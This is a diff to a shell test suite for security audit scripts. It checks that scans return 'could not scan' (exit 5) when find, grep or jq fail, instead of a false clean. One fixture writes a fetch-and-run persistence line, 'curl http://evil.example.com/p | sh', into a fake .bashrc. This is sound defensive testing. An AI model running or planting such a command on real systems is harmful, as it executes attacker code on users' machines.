@@ -180,6 +180,50 @@ out="$(HOME="$SB/fakehome" bash "$SCRIPTS/integrity-audit.sh" "$SB/empty" 2>&1)"
 expect_exit "shell-rc persistence -> 10" 10 "$rc"
 expect_has  "flags shell_rc" "shell_rc" "$out"
 
+# A producer that dies must never read as clean. A loop fed by `< <(cmd)` never
+# sees cmd's exit status, and a jq that cannot parse a config printed nothing, so
+# both once came back "Clean". Each PATH shim breaks exactly one producer; the
+# scan must answer 5 (could not scan), not 0. Isolated HOME/APPDATA so the real
+# machine's configs never leak into the verdict.
+SHIM="$SB/shim"; mkdir -p "$SHIM/find" "$SHIM/grep-oidc" "$SB/iahome" "$SB/iaproj"
+# Windows find.exe ahead of GNU find on PATH answers like this.
+printf '#!/bin/sh\necho "FIND: Parameter format not correct" >&2\nexit 2\n' > "$SHIM/find/find"
+# Dies only on the workflow OIDC grep; every other grep runs for real.
+printf '#!/bin/sh\ncase "$*" in *id-token*) echo "grep: simulated read error" >&2; exit 2 ;; esac\nexec "%s" "$@"\n' \
+  "$(command -v grep)" > "$SHIM/grep-oidc/grep"
+chmod +x "$SHIM/find/find" "$SHIM/grep-oidc/grep"
+IA=(env HOME="$SB/iahome" APPDATA="$SB/iahome")
+out="$("${IA[@]}" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "isolated empty audit -> 0 (baseline for the shims)" 0 "$rc"
+out="$("${IA[@]}" PATH="$SHIM/find:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "find dies -> 5, not clean" 5 "$rc"
+expect_has  "find dies: says project configs NOT scanned" "NOT scanned" "$out"
+out="$("${IA[@]}" PATH="$SHIM/find:$PATH" bash "$SCRIPTS/integrity-audit.sh" --json "$SB/iaproj" 2>/dev/null)"
+expect_has  "find dies: --json lists it in meta.unscanned" '"unscanned":["' "$(printf '%s' "$out" | jq -c '.meta')"
+mkdir -p "$SB/iaoidc/.github/workflows"
+printf 'permissions:\n  id-token: write\n' > "$SB/iaoidc/.github/workflows/x.yml"
+out="$("${IA[@]}" PATH="$SHIM/grep-oidc:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaoidc" 2>&1)"; rc=$?
+expect_exit "workflow grep dies -> 5, not clean" 5 "$rc"
+# Findings outrank an unscanned section: 10 is never a false clean, so it stays.
+mkdir -p "$SB/iarc"; printf 'curl http://evil.example.com/p | sh\n' > "$SB/iarc/.bashrc"
+out="$(env HOME="$SB/iarc" APPDATA="$SB/iarc" PATH="$SHIM/grep-oidc:$PATH" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaoidc" 2>&1)"; rc=$?
+expect_exit "findings + unscanned section -> 10" 10 "$rc"
+expect_has  "findings + unscanned: still warns" "NOT scanned" "$out"
+# A settings.json jq cannot parse hides its hooks; it was silently skipped.
+mkdir -p "$SB/iabad/.claude"; printf '{"hooks": {' > "$SB/iabad/.claude/settings.json"
+out="$(env HOME="$SB/iabad" APPDATA="$SB/iabad" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+expect_exit "unparseable settings.json -> 5, not clean" 5 "$rc"
+expect_has  "unparseable settings.json: named" ".claude/settings.json" "$out"
+# No jq at all: hooks/mcpServers were never read. Only provable where jq is not
+# beside bash in /usr/bin (a Linux runner ships /usr/bin/jq).
+if ! PATH="/usr/bin:/bin" command -v jq >/dev/null 2>&1; then
+  mkdir -p "$SB/iajq/.claude"; printf '{"hooks":{"PreToolUse":[]}}' > "$SB/iajq/.claude/settings.json"
+  out="$(env HOME="$SB/iajq" APPDATA="$SB/iajq" PATH="/usr/bin:/bin" bash "$SCRIPTS/integrity-audit.sh" "$SB/iaproj" 2>&1)"; rc=$?
+  expect_exit "jq missing with a settings.json -> 5, not clean" 5 "$rc"
+else
+  echo "  SKIP  integrity-audit jq-missing case (jq lives in /usr/bin here)"
+fi
+
 # ── preinstall-check.sh (offline bits only) ────────────────────────────────
 echo "-- preinstall-check.sh --"
 bash "$SCRIPTS/preinstall-check.sh" --help >/dev/null 2>&1; expect_exit "--help" 0 $?
@@ -360,11 +404,40 @@ mkdir -p "$SB/exts/pub.tool-1.0.0"
 printf '{"publisher":"pub","name":"tool","version":"1.0.0"}' > "$SB/exts/pub.tool-1.0.0/package.json"
 SC_EXT_DIRS="$SB/exts" bash "$SCAN" -q >/dev/null 2>&1; expect_exit "inventory (zero-dep) -> 0" 0 $?
 # --deep without engine: skips behavioural gracefully (exit 0) + LOUD recommendation,
-# never a false-clean. Lean default keeps guarddog/semgrep off the machine.
-out="$(PATH="/usr/bin:/bin" bash "$SCAN" --deep 2>&1)"; rc=$?
+# never a false-clean. Lean default keeps guarddog/semgrep off the machine. Empty
+# HOME and extension dirs: this PATH may lack jq, and with something to inventory
+# that is an honest 5 (below), not the case under test.
+mkdir -p "$SB/sxempty" "$SB/sxnone"
+out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/sxnone" PATH="/usr/bin:/bin" bash "$SCAN" --deep 2>&1)"; rc=$?
 expect_exit "--deep w/o engine skips (not fail) -> 0" 0 "$rc"
 expect_has  "skip notice recommends install" "uv tool install guarddog semgrep" "$out"
 expect_has  "skip notice is loud (not a clean verdict)" "SKIPPED" "$out"
+# An inventory it could not read is not "inventory done". The plugin list came
+# from a loop fed by `< <(jq ...)`, so a jq that choked on the file printed no
+# rows and the run still closed 0.
+mkdir -p "$SB/sxbad/.claude/plugins" "$SB/sxgood/.claude/plugins"
+printf '{"plugins": {' > "$SB/sxbad/.claude/plugins/installed_plugins.json"
+out="$(HOME="$SB/sxbad" SC_EXT_DIRS="$SB/sxnone" bash "$SCAN" 2>&1)"; rc=$?
+expect_exit "unparseable installed_plugins.json -> 5, not 0" 5 "$rc"
+expect_has  "unparseable plugins: says NOT read" "NOT read" "$out"
+printf '{"plugins":{"p@m":[{"gitCommitSha":"0123456789abcdef","scope":"user","lastUpdated":"2026-01-01"}]}}' \
+  > "$SB/sxgood/.claude/plugins/installed_plugins.json"
+out="$(HOME="$SB/sxgood" SC_EXT_DIRS="$SB/sxnone" bash "$SCAN" 2>&1)"; rc=$?
+expect_exit "valid installed_plugins.json -> 0" 0 "$rc"
+expect_has  "valid plugins: lists the pinned sha" "sha=0123456789ab" "$out"
+# --json stdout must be the document alone: a recently changed skill once printed
+# its "(recently changed)" row ahead of it, so `--json | jq` failed to parse.
+mkdir -p "$SB/sxgood/.claude/skills/fresh-ops"; : > "$SB/sxgood/.claude/skills/fresh-ops/run.sh"
+out="$(HOME="$SB/sxgood" SC_EXT_DIRS="$SB/sxnone" bash "$SCAN" --json 2>/dev/null)"
+printf '%s' "$out" | jq -e '.meta.unscanned == []' >/dev/null 2>&1
+expect_exit "--json with a recent skill: stdout parses, meta.unscanned empty" 0 $?
+# No jq: every extension's package.json went unread and was skipped as nameless.
+if ! PATH="/usr/bin:/bin" command -v jq >/dev/null 2>&1; then
+  out="$(HOME="$SB/sxempty" SC_EXT_DIRS="$SB/exts" PATH="/usr/bin:/bin" bash "$SCAN" 2>&1)"; rc=$?
+  expect_exit "jq missing with an extension installed -> 5, not 0" 5 "$rc"
+else
+  echo "  SKIP  scan-extensions jq-missing case (jq lives in /usr/bin here)"
+fi
 # --deep behavioural finding — only when the engine is actually present
 if command -v guarddog >/dev/null 2>&1 && semgrep --version >/dev/null 2>&1; then
   mkdir -p "$SB/evil/bad.x-1.0.0"
